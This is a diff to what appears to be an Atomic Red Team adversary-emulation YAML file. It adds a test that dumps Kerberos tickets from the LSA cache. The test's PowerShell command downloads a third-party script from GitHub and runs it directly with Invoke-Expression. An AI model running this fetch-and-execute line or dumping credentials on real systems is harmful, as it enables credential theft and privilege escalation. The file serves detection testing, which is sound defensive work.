@@ -30,3 +30,17 @@ atomic_tests:
     cleanup_command: del %temp%\secrets >nul 2> nul
     name: command_prompt
     elevation_required: true
+    - name: Dump Kerberos Tickets from LSA using dumper.ps1
+
+  description: |
+    This tool allows you to dump Kerberos tickets from the LSA cache. Implemented via Add-Type.
+    If the tool is run as a privileged user, it will automatically obtain NT AUTHORITY\SYSTEM privileges and then dump all tickets. If the tool is run as a non-privileged user, it will only dump tickets from the current logon session.
+    Ref: https://github.com/MzHmO/PowershellKerberos/
+    Author of dumper.ps1: Michael Zhmaylo (@MzHmO)
+  supported_platforms:
+  - windows
+  executor:
+    command: |
+      Invoke-Expression (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/MzHmO/PowershellKerberos/beed52acda37fc531ef0cb4df3fc2eb63a74bbb8/dumper.ps1')  
+    name: powershell
+    elevation_required: true
